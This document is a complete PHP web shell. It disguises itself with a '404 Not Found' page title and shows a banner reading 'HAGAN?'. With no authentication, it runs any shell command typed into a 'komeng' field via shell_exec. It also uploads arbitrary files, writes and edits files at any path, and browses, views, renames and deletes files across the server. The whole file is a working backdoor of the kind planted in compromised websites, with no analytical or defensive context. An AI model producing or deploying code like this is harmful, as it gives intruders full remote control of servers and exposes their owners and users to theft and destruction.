<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid black;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th.size, td.size {
            width: 100px;
        }
        th.date, td.date {
            width: 150px;
        }
        .breadcrumb {
            list-style-type: none;
            padding: 0;
            margin-bottom: 10px;
            display: flex;
        }
        .breadcrumb li {
            margin-right: 5px;
        }
        .breadcrumb li a {
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="container">
<?php
// Set current directory
$currentDirectory = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
chdir($currentDirectory);

// Handle file uploads
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
    $uploadDir = $currentDirectory . '/';
    foreach ($_FILES['files']['name'] as $key => $name) {
        $uploadFile = $uploadDir . basename($name);
        if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $uploadFile)) {
            echo '<p>File ' . htmlspecialchars($name) . ' uploaded successfully.</p>';
        } else {
            echo '<p>Failed to upload file ' . htmlspecialchars($name) . '.</p>';
        }
    }
}

// Execute shell commands
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['komeng'])) {
    $komeng = $_POST['komeng'];
    if ($komeng) {
        echo '<h3>Command Output:</h3>';
        echo '<pre>';
        echo shell_exec(escapeshellcmd($komeng));
        echo '</pre>';
    }
}

// Save file content (edit file)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
    $fileToSave = $_POST['filename'];
    $content = $_POST['content'];
    file_put_contents($fileToSave, $content);
    $dir = dirname($fileToSave);
    header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($fileToSave));
}

// Create directory
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_dir'])) {
    $newDir = $_POST['new_dir'];
    if ($newDir) {
        $newDirPath = $currentDirectory . '/' . $newDir;
        if (!is_dir($newDirPath)) {
            mkdir($newDirPath);
            echo '<p>Directory created successfully.</p>';
        } else {
            echo '<p>Directory already exists.</p>';
        }
    }
}

// Create new file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file'])) {
    $newFile = $_POST['new_file'];
    if ($newFile) {
        $newFilePath = $currentDirectory . '/' . $newFile;
        if (!file_exists($newFilePath)) {
            file_put_contents($newFilePath, '');
            echo '<p>File created successfully.</p>';
        } else {
            echo '<p>File already exists.</p>';
        }
    }
}

// Rename file or directory
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename_item'])) {
    $oldName = $currentDirectory . '/' . $_POST['old_name'];
    $newName = $currentDirectory . '/' . $_POST['new_name'];
    if (rename($oldName, $newName)) {
        echo '<p>' . htmlspecialchars($_POST['old_name']) . ' renamed to ' . htmlspecialchars($_POST['new_name']) . '</p>';
    } else {
        echo '<p>Failed to rename ' . htmlspecialchars($_POST['old_name']) . '</p>';
    }
}

// Delete file or directory
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $itemToDelete = $currentDirectory . '/' . $_POST['delete_file'];
    if (is_dir($itemToDelete)) {
        // Directory deletion
        if (rmdir($itemToDelete)) {
            echo '<p>Directory ' . htmlspecialchars($_POST['delete_file']) . ' deleted successfully.</p>';
        } else {
            echo '<p>Failed to delete directory ' . htmlspecialchars($_POST['delete_file']) . '</p>';
        }
    } elseif (is_file($itemToDelete)) {
        // File deletion
        if (unlink($itemToDelete)) {
            echo '<p>File ' . htmlspecialchars($_POST['delete_file']) . ' deleted successfully.</p>';
        } else {
            echo '<p>Failed to delete file ' . htmlspecialchars($_POST['delete_file']) . '</p>';
        }
    }
}

// View file content
if (isset($_POST['view_file'])) {
    $fileToView = $currentDirectory . '/' . $_POST['view_file'];
    if (is_file($fileToView)) {
        echo '<h3>Content of ' . htmlspecialchars($_POST['view_file']) . ':</h3>';
        echo '<pre>' . htmlspecialchars(file_get_contents($fileToView)) . '</pre>';
    } else {
        echo '<p>Cannot view content of ' . htmlspecialchars($_POST['view_file']) . '</p>';
    }
}

// List all files and directories
$items = scandir($currentDirectory);

echo '<div class="header"><h1>HAGAN?</h1></div>';
renderBreadcrumb($currentDirectory);

// File upload form
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="files[]" multiple>';
echo '<input type="submit" value="Upload File">';
echo '</form>';

// Folder creation form
echo '<form method="post">';
echo '<input type="text" name="new_dir" placeholder="Folder Name">';
echo '<input type="submit" value="Create Folder">';
echo '</form>';

// File creation/edit form
echo '<form method="post">';
echo '<input type="text" name="new_file" placeholder="File Name">';
echo '<input type="submit" value="Create File">';
echo '</form>';

// Command execution form
echo '<form method="post">';
echo '<input type="text" name="komeng" placeholder="Enter command">';
echo '<input type="submit" value="Execute Command">';
echo '</form>';

// Display the file and folder list
echo '<table>';
echo '<tr><th>Name</th><th class="size">Size</th><th class="date">Date</th><th class="permission">Writable</th><th>Actions</th></tr>';

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $itemPath = $currentDirectory . '/' . $item;
    $isWritable = is_writable($itemPath) ? 'writable' : 'not-writable';
    $fileSize = is_file($itemPath) ? filesize($itemPath) . ' bytes' : '-';
    $modifiedDate = date("Y-m-d H:i:s", filemtime($itemPath));
    
    echo '<tr>';
    echo '<td class="item-name">' . htmlspecialchars($item) . '</td>';
    echo '<td class="size">' . $fileSize . '</td>';
    echo '<td class="date">' . $modifiedDate . '</td>';
    echo '<td class="permission ' . $isWritable . '">' . strtoupper($isWritable[0]) . '</td>';
    echo '<td>';
    echo '<form style="display:inline;" method="post">';
    echo '<input type="hidden" name="view_file" value="' . htmlspecialchars($item) . '">';
    echo '<input type="submit" value="View">';
    echo '</form> ';
    echo '<form style="display:inline;" method="post">';
    echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($item) . '">';
    echo '<input type="submit" value="Delete">';
    echo '</form> ';
    echo '<form style="display:inline;" method="post">';
    echo '<input type="hidden" name="old_name" value="' . htmlspecialchars($item) . '">';
    echo '<input type="text" name="new_name" placeholder="New Name">';
    echo '<input type="submit" name="rename_item" value="Rename">';
    echo '</form>';
    echo '</td>';
    echo '</tr>';
}
echo '</table>';

// Function to render breadcrumb navigation
function renderBreadcrumb($currentDir) {
    $pathArray = explode(DIRECTORY_SEPARATOR, $currentDir);
    echo '<ul class="breadcrumb" style="justify-content:center;">';
    echo '<li><a href="?">[HOME]</a></li>';
    foreach ($pathArray as $index => $dir) {
        if ($dir === '') continue;  
        $path = implode(DIRECTORY_SEPARATOR, array_slice($pathArray, 0, $index + 1));
        echo '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a></li>';
        if ($index < count($pathArray) - 1) {
            echo '<li>/</li>';
        }
    }
    echo '</ul>';
}
?>
</div>
</body>
</html>
